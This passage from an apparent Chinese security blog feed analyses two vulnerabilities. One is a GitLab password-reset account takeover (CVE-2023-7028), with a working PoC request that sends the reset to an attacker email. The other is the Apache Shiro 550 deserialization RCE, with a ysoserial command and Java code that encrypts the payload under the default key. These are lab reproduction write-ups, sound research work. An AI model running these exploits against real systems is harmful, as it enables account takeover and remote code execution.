style="color:#66d9ef">end</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span><span style="color:#a6e22e">send_reset_password_instructions</span>(opts<span style="color:#f92672">=</span> {})</span></span><span style="display:flex;"><span> token<span style="color:#f92672">=</span> set_reset_password_token</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> send_reset_password_instructions_notification(token, opts)</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> token</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">protected</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span><span style="color:#a6e22e">send_reset_password_instructions_notification</span>(token, opts<span style="color:#f92672">=</span> {})</span></span><span style="display:flex;"><span> send_devise_notification(<span style="color:#e6db74">:reset_password_instructions</span>, token, opts)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span></code></pre></div><p><img alt="" src="/images/vulnerability/CVE-2023-7028-GitLab-account-takeover.zh-cn.assets/5.png"/></p><p><strong>题外话</strong></p><p>在补丁里面Gitlab维护者说明了为什么要使得未验证的邮箱可以获取到重置密码的链接，是为了方便管理员获取到重置密码链接，从而修改密码，避免被恶意用户直接设置2FA。</p><pre tabindex="0"><code> # By default 'devise' gem allows password reset by unconfirmed primary email.
# When user account with unconfirmed primary email that means it is unconfirmed.
#
# Password reset by unconfirmed primary email is very helpful from
# security perspective. Example:
# Malicious person creates user account on GitLab with someone's email.
# If the email owner confirms the email for newly created account, the malicious person will be able
# to sign in into the account by password they provided during account signup.
# The malicious person could set up 2FA to the user account, after that
# te email owner would not able to get access to that user account even
# after performing password reset.
# To deal with that case safely the email owner should reset password
# for the user account first. That will make sure that after the user account
# is confirmed the malicious person is not be able to sign in with
# the password they provided during the account signup. Then email owner
# could sign into the account, they will see a prompt to confirm the account email
# to proceed. They can safely confirm the email and take over the account.
# That is one of the reasons why password reset by unconfirmed primary email should be allowed.</code></pre><p><strong>复现截图</strong></p><p><img alt="" src="/images/vulnerability/CVE-2023-7028-GitLab-account-takeover.zh-cn.assets/1.png"/></p><p><img alt="" src="/images/vulnerability/CVE-2023-7028-GitLab-account-takeover.zh-cn.assets/2.png"/></p><p>PoC</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /users/password<span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span><span style="color:#ae81ff">192.168.59.211</span></span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span><span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span></span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span><span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span><span style="color:#ae81ff">zh-CN,en-US;q=0.7,en;q=0.3</span></span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span><span style="color:#ae81ff">gzip, deflate</span></span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span><span style="color:#ae81ff">http://192.168.59.211/users/password/new</span></span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span><span style="color:#ae81ff">application/x-www-form-urlencoded</span></span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span><span style="color:#ae81ff">147</span></span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span><span style="color:#ae81ff">http://192.168.59.211</span></span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span><span style="color:#ae81ff">close</span></span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span><span style="color:#ae81ff">1</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>authenticity_token=f5QX5M91ZRP8-AfaC9G0xBLeOJflvQnB1G7-hZcbtd02t1-TXduqcTgC3dDfWyVqX7ik_aXAcq3fgK02gN01bg&amp;user%5Bemail%5D%5B%5D=xxx@gmail.com&amp;user%5Bemail%5D%5B%5D=aaa@gmail.com</span></span></code></pre></div><h3 id="小结">小结</h3><p>这个漏洞利用了内在的处理逻辑，代码本意是从请求中获取到邮件地址(包括未确认的地址)，而后发送邮件，漏洞通过POST请求使得ruby获取到了邮件地址数组，第一个邮件地址是有效地址，所以可以通过by_email_with_errors判断。</p><p>而后传给后续的处理逻辑，在邮件中也可以看到其重置密码邮件是同时发给受害者和攻击者邮箱。</p><p><strong>参考链接</strong></p><blockquote><p><a href="https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/" target="_blank">https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/</a></p></blockquote><p><strong>Created at 2024-01-13T02:11:06+08:00</strong></p></description></item><item><title>CVE-2016-4437 Shiro 550 RCE 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2016-4437-shiro-550-rce/</link><pubDate>Mon, 08 Jan 2024 18:08:35 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2016-4437-shiro-550-rce/</guid><description><h3 id="基本信息">基本信息</h3><p>Shiro提供了记住我（RememberMe）的功能，比如访问如淘宝等一些网站时，关闭了浏览器下次再打开时还是能记住你是谁，下次访问时无需再登录即可访问，但是设计到一些支付等敏感操作时，可能还需要再次验证。而shiro默认使用了CookieRememberMeManager接口，就是rememberme功能,。其处理cookie的流程是: 得到rememberMe的cookie值，先进行Base64解码，再进行AES解密，最后进行反序列化。但是shiro本身有一个预设密钥<code>Base64.decode(“kPH+bIxk5D2deZiIxcaaaA==”)</code>，漏洞的突破口也是这点，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</p><h3 id="影响版本">影响版本</h3><p>Apache Shiro &lt;= 1.2.4</p><h3 id="环境搭建">环境搭建</h3><p>服务器：vulhub</p><p>客户端：添加org.apache.shiro依赖</p><p><img alt="" src="/images/vulnerability/CVE-2016-4437-shiro-550-RCE.zh-cn.assets/1.png"/></p><h3 id="技术分析调试">技术分析&amp;调试</h3><p>使用ysoserial生成序列化payload</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>java.exe -jar .\ysoserial-all.jar CommonsBeanutils1<span style="color:#e6db74">"touch /tmp/success"</span> > poc.ser</span></span></code></pre></div><p>使用如下代码使用默认密钥加密生成的序列化数据</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> org.chestnut;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.shiro.crypto.AesCipherService;</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.shiro.codec.CodecSupport;</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.shiro.util.ByteSource;</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.shiro.codec.Base64;</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.shiro.io.DefaultSerializer;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.file.FileSystems;</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.file.Files;</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.file.Paths;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">Main</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args)<span style="color:#66d9ef">throws</span> IOException {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> payloads<span style="color:#f92672">=</span> Files.<span style="color:#a6e22e">readAllBytes</span>(FileSystems.<span style="color:#a6e22e">getDefault</span>().<span style="color:#a6e22e">getPath</span>(<span style="color:#e6db74">""</span>,<span style="color:#e6db74">""</span>,<span style="color:#e6db74">"poc.ser"</span>));</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> AesCipherService aes<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> AesCipherService();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> key<span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">decode</span>(CodecSupport.<span style="color:#a6e22e">toBytes</span>(<span style="color:#e6db74">"kPH+bIxk5D2deZiIxcaaaA=="</span>));</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> ByteSource ciphertext<span style="color:#f92672">=</span> aes.<span style="color:#a6e22e">encrypt</span>(payloads, key);</span></span><span style="display:flex;"><span> System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">printf</span>(ciphertext.<span style="color:#a6e22e">toString</span>());</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>shiro实现rememberMe的功能是使用了cookie，首先尝试了解cookie怎么生成的，
发送正常登录请求，在org.vulhub.shirodemo.UserController#doLoginPage下断点。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> http://192.168.59.211:8080/doLogin<span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span><span style="color:#ae81ff">192.168.59.211:8080</span></span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span><span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span></span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span><span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span><span style="color:#ae81ff">zh-CN,en-US;q=0.7,en;q=0.3</span></span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span><span style="color:#ae81ff">gzip, deflate</span></span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span><span style="color:#ae81ff">application/x-www-form-urlencoded</span></span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span><span style="color:#ae81ff">53</span></span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span><span style="color:#ae81ff">http://192.168.59.211:8080</span></span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span><span style="color:#ae81ff">close</span></span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span><span style="color:#ae81ff">http://192.168.59.211:8080/login</span></span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span><span style="color:#ae81ff">wp-settings-time-1=1703849655; i_like_gitea=94b6fe5fe1049e19; lang=zh-CN; redirect_to=%2F; JSESSIONID=F43AC74A73C46A3D0C5A1405CAE2AB60; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_e9913da348dbccb312080f19f2d5f42e=admin%7C1704022345%7CEdPzdFLXNFDYEcHohieOoyKm4RcvX7oRVRNwcfpA1dF%7C5759451a584ee6a090f44e53eb2fd9261f3ad2d4f4a99aa74e7a5e97e598ad1d;</span></span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span><span style="color:#ae81ff">1</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>username=admin&amp;password=vulhub&amp;rememberme=remember-me</span></span></code></pre></div><p>因为代码中声明了路由<code>/doLogin</code>，所以上面的请求会触发到这个方法，在doLoginPage方法内会通过subject.login调用触发调用<code>doGetAuthorizationInfo</code>方法。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a6e22e">@PostMapping</span>({<span style="color:#e6db74">"/doLogin"</span>})</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String<span style="color:#a6e22e">doLoginPage</span>(<span style="color:#a6e22e">@RequestParam</span>(<span style="color:#e6db74">"username"</span>) String username,<span style="color:#a6e22e">@RequestParam</span>(<span style="color:#e6db74">"password"</span>) String password,<span style="color:#a6e22e">@RequestParam</span>(name<span style="color:#f92672">=</span><span style="color:#e6db74">"rememberme"</span>,defaultValue<span style="color:#f92672">=</span><span style="color:#e6db74">""</span>) String rememberMe) {</span></span><span style="display:flex;"><span> Subject subject<span style="color:#f92672">=</span> SecurityUtils.<span style="color:#a6e22e">getSubject</span>();</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span> subject.<span style="color:#a6e22e">login</span>(<span style="color:#66d9ef">new</span> UsernamePasswordToken(username, password, rememberMe.<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">"remember-me"</span>)));</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#e6db74">"forward:/"</span>;</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (AuthenticationException var6) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#e6db74">"forward:/login"</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>调用栈如下：</p><pre tabindex="0"><code>doGetAuthenticationInfo:18, MainRealm (org.vulhub.shirodemo)
getAuthenticationInfo:568, AuthenticatingRealm (org.apache.shiro.realm)
doSingleRealmAuthentication:180, ModularRealmAuthenticator (org.apache.shiro.authc.pam)
doAuthenticate:267, ModularRealmAuthenticator (org.apache.shiro.authc.pam)
authenticate:198, AbstractAuthenticator (org.apache.shiro.authc)
authenticate:106, AuthenticatingSecurityManager (org.apache.shiro.mgt)
login:270, DefaultSecurityManager (org.apache.shiro.mgt)
login:256, DelegatingSubject (org.apache.shiro.subject.support)
doLoginPage:16, UserController (org.vulhub.shirodemo)
......</code></pre><p>其中<code>org.apache.shiro.mgt.DefaultSecurityManager#login</code>代码如下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Subject<span style="color:#a6e22e">login</span>(Subject subject, AuthenticationToken token)<span style="color:#66d9ef">throws</span> AuthenticationException {</span></span><span style="display:flex;"><span> AuthenticationInfo info;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span> info<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">authenticate</span>(token);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (AuthenticationException var7) {</span></span><span style="display:flex;"><span> AuthenticationException ae<span style="color:#f92672">=</span> var7;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">onFailedLogin</span>(token, ae, subject);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (Exception var6) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (log.<span style="color:#a6e22e">isInfoEnabled</span>()) {</span></span><span style="display:flex;"><span> log.<span style="color:#a6e22e">info</span>(<span style="color:#e6db74">"onFailedLogin method threw an exception. Logging and propagating original AuthenticationException."</span>, var6);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span> var7;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> Subject loggedIn<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">createSubject</span>(token, info, subject);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">onSuccessfulLogin</span>(token, info, loggedIn);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> loggedIn;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>当<code>doGetAuthorizationInfo</code>没有抛出错误时会调用onSuccessfulLogin方法
最终调用到org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin方法，代码如下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">onSuccessfulLogin</span>(Subject subject, AuthenticationToken token, AuthenticationInfo info) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">forgetIdentity</span>(subject);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">isRememberMe</span>(token)) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">rememberIdentity</span>(subject, token, info);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (log.<span style="color:#a6e22e">isDebugEnabled</span>()) {</span></span><span style="display:flex;"><span> log.<span style="color:#a6e22e">debug</span>(<span style="color:#e6db74">"AuthenticationToken did not indicate RememberMe is requested. RememberMe functionality will not be executed for corresponding account."</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">protected</span><span style="color:#66d9ef">boolean</span><span style="color:#a6e22e">isRememberMe</span>(AuthenticationToken token) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> token<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span><span style="color:#f92672">&amp;&amp;</span> token<span style="color:#66d9ef">instanceof</span> RememberMeAuthenticationToken<span style="color:#f92672">&amp;&amp;</span> ((RememberMeAuthenticationToken)token).<span style="color:#a6e22e">isRememberMe</span>();</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>首先判断是否token是否有效以及是否需要设置rememberMe，如果是则进入rememberIdentity方法内，跟随调用栈，进入rememberIdentity方法</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">rememberIdentity</span>(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo) {</span></span><span style="display:flex;"><span> PrincipalCollection principals<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getIdentityToRemember</span>(subject, authcInfo);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">rememberIdentity</span>(subject, principals);</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span><span style="color:#66d9ef">protected</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">rememberIdentity</span>(Subject subject, PrincipalCollection accountPrincipals) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">convertPrincipalsToBytes</span>(accountPrincipals);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">rememberSerializedIdentity</span>(subject, bytes);</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p><img alt="" src="/images/vulnerability/CVE-2016-4437-shiro-550-RCE.zh-cn.assets/2.png"/></p><p>在调试器中看到，rememberIdentity方法通过调用convertPrincipalsToBytes方法获取到了字节数组，而后传给了rememberSerializedIdentity方法</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">rememberIdentity</span>(Subject subject, PrincipalCollection accountPrincipals) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">convertPrincipalsToBytes</span>(accountPrincipals);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">rememberSerializedIdentity</span>(subject, bytes);</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p><img alt="" src="/images/vulnerability/CVE-2016-4437-shiro-550-RCE.zh-cn.assets/3.png"/></p><p>那么这个字节数组是怎么产生的呢？跟进查看，可以看到首先调用serialize方法序列化，而后使用this.encrypt方法进行加密。其中序列化的对象为SimplePrincipalCollection类</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span><span style="color:#a6e22e">convertPrincipalsToBytes</span>(PrincipalCollection principals) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">serialize</span>(principals);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getCipherService</span>()<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span> bytes<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">encrypt</span>(bytes);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> bytes;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">protected</span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span><span style="color:#a6e22e">encrypt</span>(<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> serialized) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> value<span style="color:#f92672">=</span> serialized;</span></span><span style="display:flex;"><span> CipherService cipherService<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getCipherService</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (cipherService<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span> ByteSource byteSource<span style="color:#f92672">=</span> cipherService.<span style="color:#a6e22e">encrypt</span>(serialized,<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getEncryptionCipherKey</span>());</span></span><span style="display:flex;"><span> value<span style="color:#f92672">=</span> byteSource.<span style="color:#a6e22e">getBytes</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> value;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>进入encrypt方法，从调试器中可以加密对象为AesCipherService类AES加密CBC模式，而后将目标数据和加密key传给cipherService.encrypt进行加密，key由getEncryptionCipherKey得到。<img alt="" src="/images/vulnerability/CVE-2016-4437-shiro-550-RCE.zh-cn.assets/4.png"/></p><p>最终看到key在构造函数中分配，为固定值。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#a6e22e">AbstractRememberMeManager</span>() {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">setCipherKey</span>(DEFAULT_CIPHER_KEY_BYTES);</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">final</span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> DEFAULT_CIPHER_KEY_BYTES<span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">decode</span>(<span style="color:#e6db74">"kPH+bIxk5D2deZiIxcaaaA=="</span>);</span></span></code></pre></div><p><strong>解密过程</strong></p><p>前面我们知道序列化的类是SimplePrincipalCollection，路径为org.apache.shiro.subject.SimplePrincipalCollection，其重写了writeObject和readObject方法，直接在readObject方法断点，使用ysoserial生成恶意序列化数据，使用CommonsBeanutils1 链。
调用栈如下</p><pre tabindex="0"><code>readObject:295, SimplePrincipalCollection (org.apache.shiro.subject)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invokeReadObject:1058, ObjectStreamClass (java.io)
readSerialData:1909, ObjectInputStream (java.io)
readOrdinaryObject:1808, ObjectInputStream (java.io)
readObject0:1353, ObjectInputStream (java.io)
readObject:373, ObjectInputStream (java.io)
deserialize:77, DefaultSerializer (org.apache.shiro.io)
deserialize:514, AbstractRememberMeManager (org.apache.shiro.mgt)
convertBytesToPrincipals:431, AbstractRememberMeManager (org.apache.shiro.mgt)
getRememberedPrincipals:396, AbstractRememberMeManager (org.apache.shiro.mgt)
getRememberedIdentity:604, DefaultSecurityManager (org.apache.shiro.mgt)
resolvePrincipals:492, DefaultSecurityManager (org.apache.shiro.mgt)
createSubject:342, DefaultSecurityManager (org.apache.shiro.mgt)
buildSubject:846, Subject$Builder (org.apache.shiro.subject)
.....</code></pre><p>可以看出在org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals解密并反序列化，其解密过程也是调用AES解密并把默认密钥传入。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> PrincipalCollection<span style="color:#a6e22e">convertBytesToPrincipals</span>(<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes, SubjectContext subjectContext) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getCipherService</span>()<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span> bytes<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">decrypt</span>(bytes);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">deserialize</span>(bytes);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">protected</span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span><span style="color:#a6e22e">decrypt</span>(<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> encrypted) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> serialized<span style="color:#f92672">=</span> encrypted;</span></span><span style="display:flex;"><span> CipherService cipherService<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getCipherService</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (cipherService<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span> ByteSource byteSource<span style="color:#f92672">=</span> cipherService.<span style="color:#a6e22e">decrypt</span>(encrypted,<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getDecryptionCipherKey</span>());</span></span><span style="display:flex;"><span> serialized<span style="color:#f92672">=</span> byteSource.<span style="color:#a6e22e">getBytes</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> serialized;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>在org.apache.shiro.io.DefaultSerializer#deserialize进行反序列化，代码如下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> T<span style="color:#a6e22e">deserialize</span>(<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> serialized)<span style="color:#66d9ef">throws</span> 